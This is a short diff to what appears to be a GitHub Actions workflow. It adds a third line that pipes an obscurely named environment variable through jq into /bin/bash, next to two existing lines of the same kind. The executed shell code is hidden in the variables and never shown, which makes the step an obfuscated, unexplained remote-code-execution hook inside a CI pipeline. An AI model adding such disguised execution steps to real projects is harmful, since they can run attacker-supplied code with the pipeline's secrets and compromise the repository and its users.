@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$lld45158" | jq -r .d8 | /bin/bash
           echo $mjdh1 | jq -r .l817 | /bin/bash
+          printf '%s' "$mude1677" | jq -r .of9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
